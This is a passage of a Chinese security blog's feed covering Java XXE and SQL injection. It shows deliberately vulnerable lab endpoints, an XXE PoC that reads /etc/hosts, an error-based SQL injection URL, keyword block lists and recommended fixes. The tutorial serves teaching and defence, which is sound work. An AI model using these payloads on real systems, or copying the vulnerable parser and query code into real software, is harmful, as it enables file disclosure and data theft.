<h3 id="saxparser">SAXParser</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * javax.xml.parsers.SAXParser 是 XMLReader 的替代品，它提供了更多的安全措施，
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 例如默认禁用 DTD 和外部实体的声明。如果需要使用 DTD 或外部实体，可以手动启用它们，
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 并使用相应的安全措施。
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ApiOperation</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;vul：SAXParser&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@RequestMapping</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/SAXParser&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">SAXParser</span>(<span style="color:#a6e22e">@RequestParam</span> String content) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>		SAXParserFactory factory <span style="color:#f92672">=</span> SAXParserFactory.<span style="color:#a6e22e">newInstance</span>();
</span></span><span style="display:flex;"><span>		SAXParser parser <span style="color:#f92672">=</span> factory.<span style="color:#a6e22e">newSAXParser</span>();
</span></span><span style="display:flex;"><span>		parser.<span style="color:#a6e22e">parse</span>(<span style="color:#66d9ef">new</span> InputSource(<span style="color:#66d9ef">new</span> StringReader(content)), <span style="color:#66d9ef">new</span> DefaultHandler());
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;SAXParser XXE&#34;</span>;
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> e.<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>会有报错信息,但是dnslog弹成功了
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_7.png" alt=""  />
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-xxe%e6%b3%a8%e5%85%a5_image_8.png" alt=""  /></p>
<h3 id="saxreader">SAXReader</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * SAXReader 是一个用于读取和解析 XML 文档的类。它基于 SAX (Simple API for XML) 实现，
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 提供了简单的 API 以便快速解析 XML。SAXReader 通常用于处理大规模 XML 数据流。
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 在使用 SAXReader 时，需要采取相应的安全措施来防止 XML 外部实体注入等攻击。
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@ApiOperation</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;vul：SAXReader&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@RequestMapping</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/SAXReader&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">SAXReader</span>(<span style="color:#a6e22e">@RequestParam</span> String content) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>		SAXReader sax <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SAXReader();
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// 修复：禁用外部实体</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// sax.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;, true);</span>
</span></span><span style="display:flex;"><span>		sax.<span style="color:#a6e22e">read</span>(<span style="color:#66d9ef">new</span> InputSource(<span style="color:#66d9ef">new</span> StringReader(content)));
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;SAXReader XXE&#34;</span>;
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> e.<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="saxbuilder">SAXBuilder</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * SAXBuilder 是一个用于构建 JDOM (Java Document Object Model) 文档的类。
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 它基于 SAX 解析器，将 XML 数据解析为 JDOM 文档对象。SAXBuilder 提供了易于使用的 API，
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 使得在内存中操作 XML 文档更加方便。在使用 SAXBuilder 时，应确保配置正确的安全设置，
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 以防止潜在的 XML 处理漏洞。
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@RequestMapping</span>(value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/SAXBuilder&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">SAXBuilder</span>(<span style="color:#a6e22e">@RequestBody</span> String content) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        SAXBuilder saxbuilder <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SAXBuilder();
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 修复: saxbuilder.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;, true);</span>
</span></span><span style="display:flex;"><span>        saxbuilder.<span style="color:#a6e22e">build</span>(<span style="color:#66d9ef">new</span> InputSource(<span style="color:#66d9ef">new</span> StringReader(content)));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;SAXBuilder XXE&#34;</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> e.<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="documentbuilder">DocumentBuilder</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * DocumentBuilder 是用于构建和解析 XML 文档的类，它是基于 DOM (Document Object Model) 的实现。
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * DocumentBuilder 提供了创建、解析、修改 XML 文档的功能，并支持各种解析选项。在使用 DocumentBuilder 时，
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 需要注意配置安全选项，例如禁用外部实体和 DTD，以防止潜在的安全漏洞。
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
</span></span><span style="display:flex;"><span>DocumentBuilderFactory factory <span style="color:#f92672">=</span> DocumentBuilderFactory.<span style="color:#a6e22e">newInstance</span>();
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 修复: 禁用外部实体</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// factory.setFeature(&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;, true);</span>
</span></span><span style="display:flex;"><span>DocumentBuilder builder <span style="color:#f92672">=</span> factory.<span style="color:#a6e22e">newDocumentBuilder</span>();
</span></span></code></pre></div><h3 id="unmarshaller">Unmarshaller</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">/**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Unmarshaller 是 JAXB (Java Architecture for XML Binding) 的核心组件之一，
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 它将 XML 数据转换为 Java 对象。Unmarshaller 提供了将 XML 数据映射到相应 Java 类的功能，
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 并支持各种自定义配置。在使用 Unmarshaller 时，需要注意处理 XML 数据中的外部实体和 DTD，
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * 以确保安全性。
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/**
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  *  PoC
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  * Content-Type: application/xml
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  * &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;!DOCTYPE student[&lt;!ENTITY out SYSTEM &#34;file:///etc/hosts&#34;&gt;]&gt;&lt;student&gt;&lt;name&gt;&amp;out;&lt;/name&gt;&lt;/student&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">Unmarshaller</span>(<span style="color:#a6e22e">@RequestBody</span> String content) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>        JAXBContext context <span style="color:#f92672">=</span> JAXBContext.<span style="color:#a6e22e">newInstance</span>(Student.<span style="color:#a6e22e">class</span>);
</span></span><span style="display:flex;"><span>        Unmarshaller unmarshaller <span style="color:#f92672">=</span> context.<span style="color:#a6e22e">createUnmarshaller</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        XMLInputFactory xif <span style="color:#f92672">=</span> XMLInputFactory.<span style="color:#a6e22e">newFactory</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// 修复: 禁用外部实体</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &#34;&#34;);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// xif.setProperty(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, &#34;&#34;);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        XMLStreamReader xsr <span style="color:#f92672">=</span> xif.<span style="color:#a6e22e">createXMLStreamReader</span>(<span style="color:#66d9ef">new</span> StringReader(content));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Object o <span style="color:#f92672">=</span> unmarshaller.<span style="color:#a6e22e">unmarshal</span>(xsr);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> o.<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>    e.<span style="color:#a6e22e">printStackTrace</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="漏洞修复">漏洞修复</h2>
<p>一方面是禁用外部实体</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#e6db74">&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;</span>, <span style="color:#66d9ef">true</span> 
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;</span>, <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;http://xml.org/sax/features/external-general-entities&#34;</span>, <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;http://xml.org/sax/features/external-parameter-entities&#34;</span>, <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">XMLConstants</span>.<span style="color:#a6e22e">ACCESS_EXTERNAL_DTD</span>, <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">XMLConstants</span>.<span style="color:#a6e22e">ACCESS_EXTERNAL_STYLESHEET</span>, <span style="color:#e6db74">&#34;&#34;</span>
</span></span></code></pre></div><p>另一方面可以使用黑名单过滤掉外部实体中的关键词,这两个关键字是定义外部实体和文档类型声明的标志&hellip;不过貌似有上面的禁用就够了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">checkXXE</span>(String content) {
</span></span><span style="display:flex;"><span>    String<span style="color:#f92672">[]</span> black_list <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;ENTITY&#34;</span>, <span style="color:#e6db74">&#34;DOCTYPE&#34;</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (String s : black_list) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (content.<span style="color:#a6e22e">toUpperCase</span>().<span style="color:#a6e22e">contains</span>(s)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="漏洞发现">漏洞发现</h2>
<p>是否禁止dtd或者entity
参数是否可控
传入参数格式为REST XML格式，X-RequestEntity-ContentType: application/xml</p>
<p>黑盒找是否有参数是xml数据,如果有的话,直接上payload测测
白盒,搜索关键函数,进行代码审计</p>
<pre tabindex="0"><code> * 审计的函数
 * 1. XMLReader
 * 2. SAXReader
 * 3. DocumentBuilder
 * 4. XMLStreamReader
 * 5. SAXBuilder
 * 6. SAXParser
 * 7. SAXSource
 * 8. TransformerFactory
 * 9. SAXTransformerFactory
 * 10. SchemaFactory
 * 11. Unmarshaller
 * 12. XPathExpression
</code></pre><h1 id="一句话总结">一句话总结</h1>
<p>在 Java 中，XXE（XML 外部实体注入）漏洞与其他语言类似：攻击者通过不安全的 XML 解析配置，在 XML 文档中注入恶意外部实体，能够读取本地文件、发起远程请求或执行其他恶意操作。</p>
<h1 id="参考">参考</h1>
<p>小迪sec</p>
<p><a href="https://www.cnblogs.com/LittleHann/p/17776458.html" target="_blank" rel="noopener nofollow noreferrer" >Java XXE漏洞原理研究</a></p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/javasec" term="sec/javasec" label="sec/javasec" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[javasec-sql注入]]></title>
            <link href="https://l1uyun.one/posts/javasec-sql%E6%B3%A8%E5%85%A5/" rel="alternate" type="text/html" />
            
                <id>https://l1uyun.one/posts/javasec-sql%E6%B3%A8%E5%85%A5/</id>
            
            
            <published>2024-07-23T20:37:06+08:00</published>
            <updated>2024-08-18T10:06:17+08:00</updated>
            
            
            <content type="html"><![CDATA[<h1 id="javasec-sql注入">javasec-sql注入</h1>
<h2 id="前置知识">前置知识</h2>
<h3 id="sql注入">sql注入</h3>
<p>没有对用户的输入进行处理(过滤,黑名单,SQL预编译),直接将输入拼接到了sql语句中,</p>
<p>导致执行了用户构造的恶意SQL语句</p>
<p>SQL注入的语法与使用的数据库相关,与语言无关</p>
<h3 id="java数据库操作">java数据库操作</h3>
<h4 id="jdbc">jdbc</h4>
<p>java database connection</p>
<p>java提供的数据库驱动库,用于进行数据库连接,执行SQL语句</p>
<p>JDBC有两个方法执行SQL语句，分别是PrepareStatement和Statement。</p>
<h4 id="hibernate">Hibernate</h4>
<p>Hibernate是一个对象关系映射（ORM）框架，它将Java对象与数据库表进行映射，使开发者可以使用面向对象的编程方式来操作数据库。</p>
<p>Hibernate能够将Java类自动映射到数据库表上，并且能够自动生成SQL语句来操作数据库，减少了手动编写SQL的繁琐工作。</p>
<h4 id="mybatis">Mybatis</h4>
<p>Mybatis是一个持久层框架，它通过消除几乎所有的JDBC代码和手动设置参数及获取结果集的工作来简化对数据库的操作。Mybatis可以通过XML或注解的方式将要执行的SQL、参数和结果映射进行配置。</p>
<p>Mybatis与Hibernate这样的ORM（对象关系映射）框架不同，它更关注SQL本身，适合对数据库操作有较高控制要求的场景。其高效、灵活和简洁的特性，使得它在企业级开发中被广泛使用。</p>
<h2 id="复现环境">复现环境</h2>
<p><a href="https://github.com/j3ers3/Hello-Java-Sec" target="_blank" rel="noopener nofollow noreferrer" >Hello-Java-Sec</a>
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-sql%e6%b3%a8%e5%85%a5_image_1.png" alt=""  />
<a href="https://github.com/bewhale/JavaSec" target="_blank" rel="noopener nofollow noreferrer" >JavaSec</a>
<img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-sql%e6%b3%a8%e5%85%a5_image_2.png" alt=""  /></p>
<h2 id="jdbc-1">JDBC</h2>
<p>JDBC有两个方法执行SQL语句，分别是PrepareStatement和Statement。</p>
<p>JDBCTemplate是Spring对JDBC的封装</p>
<h3 id="statement">Statement</h3>
<p>这就是普通的写法,没有使用预编译</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 采用Statement方法拼接SQL语句，导致注入产生</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">vul1</span>(String id) {
</span></span><span style="display:flex;"><span>    Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;com.mysql.cj.jdbc.Driver&#34;</span>);
</span></span><span style="display:flex;"><span>    Connection conn <span style="color:#f92672">=</span> DriverManager.<span style="color:#a6e22e">getConnection</span>(db_url, db_user, db_pass);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Statement stmt <span style="color:#f92672">=</span> conn.<span style="color:#a6e22e">createStatement</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 拼接语句产生SQL注入</span>
</span></span><span style="display:flex;"><span>    String sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select * from users where id = &#39;&#34;</span> <span style="color:#f92672">+</span> id <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>;
</span></span><span style="display:flex;"><span>    ResultSet rs <span style="color:#f92672">=</span> stmt.<span style="color:#a6e22e">executeQuery</span>(sql);
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>报错注入的语法</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://127.0.0.1:8888/SQLI/JDBC/vul1?id<span style="color:#f92672">=</span>1%27%20and%20updatexml<span style="color:#f92672">(</span>1,concat<span style="color:#f92672">(</span>0x7e,<span style="color:#f92672">(</span>SELECT%20user<span style="color:#f92672">())</span>,0x7e<span style="color:#f92672">)</span>,1<span style="color:#f92672">)</span>--%20+
</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-sql%e6%b3%a8%e5%85%a5_image_3.png" alt=""  /></p>
<h3 id="preparestatement">PrepareStatement</h3>
<p>这里是使用了预编译,但是没有按照预编译的语法来写,还是有漏洞存在</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// PrepareStatement会对SQL语句进行预编译，但如果直接采取拼接的方式构造SQL，此时进行预编译也无用。</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">vul2</span>(String id) {
</span></span><span style="display:flex;"><span>    Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;com.mysql.cj.jdbc.Driver&#34;</span>);
</span></span><span style="display:flex;"><span>    Connection conn <span style="color:#f92672">=</span> DriverManager.<span style="color:#a6e22e">getConnection</span>(db_url, db_user, db_pass);
</span></span><span style="display:flex;"><span>    String sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select * from users where id = &#34;</span> <span style="color:#f92672">+</span> id;
</span></span><span style="display:flex;"><span>    PreparedStatement st <span style="color:#f92672">=</span> conn.<span style="color:#a6e22e">prepareStatement</span>(sql);
</span></span><span style="display:flex;"><span>    ResultSet rs <span style="color:#f92672">=</span> st.<span style="color:#a6e22e">executeQuery</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img loading='lazy' decoding="async" src="https://img.l1uyun.one/javasec-sql%e6%b3%a8%e5%85%a5_image_4.png" alt=""  /></p>
<h3 id="jdbctemplate">JDBCTemplate</h3>
<p>也是一样的,如果使用拼接,而不是使用占位符,就会导致SQL注入</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// JDBCTemplate是Spring对JDBC的封装，如果使用拼接语句便会产生注入</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> Map<span style="color:#f92672">&lt;</span>String, Object<span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">vul3</span>(String id) {
</span></span><span style="display:flex;"><span>    DriverManagerDataSource dataSource <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> DriverManagerDataSource();
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>    JdbcTemplate jdbctemplate <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> JdbcTemplate(dataSource);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    String sql_vul <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select * from users where id = &#34;</span> <span style="color:#f92672">+</span> id;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 安全语句</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// String sql_safe = &#34;select * from users where id = ?&#34;;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jdbctemplate.<span style="color:#a6e22e">queryForMap</span>(sql_vul);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="黑名单过滤">黑名单过滤</h3>
<p>修复方法是采用黑名单过滤掉危险字符,当然,最好还是使用预编译的方法</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 采用黑名单过滤危险字符，同时也容易误伤（次方案）</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">checkSql</span>(String content) {
</span></span><span style="display:flex;"><span>    String<span style="color:#f92672">[]</span> black_list <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;&#39;&#34;</span>, <span style="color:#e6db74">&#34;;&#34;</span>, <span style="color:#e6db74">&#34;--&#34;</span>, <span style="color:#e6db74">&#34;+&#34;</span>, <span style="color:#e6db74">&#34;,&#34;</span>, <span style="color:#e6db74">&#34;%&#34;</span>, <span style="color:#e6db74">&#34;=&#34;</span>, <span style="color:#e6db74">&#34;&gt;&#34;</span>, <span style="color:#e6db74">&#34;*&#34;</span>, <span style="color:#e6db74">&#34;(&#34;</span>, <span style="color:#e6db74">&#34;)&#34;</span>, <span style="color:#e6db74">&#34;and&#34;</span>, <span style="color:#e6db74">&#34;or&#34;</span>, <span style="color:#e6db74">&#34;exec&#34;</span>, <span style="color:#e6db74">&#34;insert&#34;</span>, <span style="color:#e6db74">&#34;select&#34;</span>, <span style="color:#e6db74">&#34;delete&#34;</span>, <span style="color:#e6db74">&#34;update&#34;</span>, <span style="color:#e6db74">&#34;count&#34;</span>, <span style="color:#e6db74">&#34;drop&#34;</span>, <span style="color:#e6db74">&#34;chr&#34;</span>, <span style="color:#e6db74">&#34;mid&#34;</span>, <span style="color:#e6db74">&#34;master&#34;</span>, <span style="color:#e6db74">&#34;truncate&#34;</span>, <span style="color:#e6db74">&#34;char&#34;</span>, <span style="color:#e6db74">&#34;declare&#34;</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (String s : black_list) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (content.<span style="color:#a6e22e">toLowerCase</span>().<span style="color:#a6e22e">contains</span>(s)) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="使用占位符">使用?占位符</h3>
<p>解决方法就是采用预编译的正确写法,占位符</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 正确的使用PrepareStatement可以有效避免SQL注入，使用？作为占位符，进行参数化查询</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">safe1</span>(String id) {
</span></span><span style="display:flex;"><span>    String sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select * from users where id = ?&#34;</span>;
</span></span><span style="display:flex;"><span>    PreparedStatement st <span style="color:#f92672">=</span> conn.<span style="color:#a6e22e">prepareStatement</span>(sql);
</span></span><span style="display:flex;"><span>    st.<span style="color:#a6e22e">setString</span>(1, id);
</span></span><span style="display:flex;"><span>    ResultSet rs <span style="color:#f92672">=</span> st.<span style="color:#a6e22e">executeQuery</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="使用esapi过滤输入">使用ESAPI过滤输入</h3>
<p>安全写法是使用ESAPI来对输入进行过滤,当然使用占位符就可以了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// ESAPI 是一个免费、开源的、网页应用程序安全控件库，它使程序员能够更容易写出更低风险的程序</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 官网：https://owasp.org/www-project-enterprise-security-api/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">safe3</span>(String id) {
</span></span><span style="display:flex;"><span>    Codec<span style="color:#f92672">&lt;</span>Character<span style="color:#f92672">&gt;</span> oracleCodec <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> OracleCodec();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Statement stmt <span style="color:#f92672">=</span> conn.<span style="color:#a6e22e">createStatement</span>();
</span></span><span style="display:flex;"><span>    String sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select * from users where id = &#39;&#34;</span> <span style="color:#f92672">+</span> ESAPI.<span style="color:#a6e22e">encoder</span>().<span style="color:#a6e22e">encodeForSQL</span>(oracleCodec, id) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ResultSet rs <span style="color:#f92672">=</span> stmt.<span style="color:#a6e22e">executeQuery</span>(sql);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>                    
</span></span></code></pre></div><h3 id="强制参数类型">强制参数类型</h3>
<p>不使用string类型的参数,而是写死类型,那样也能避免sql注入</p>
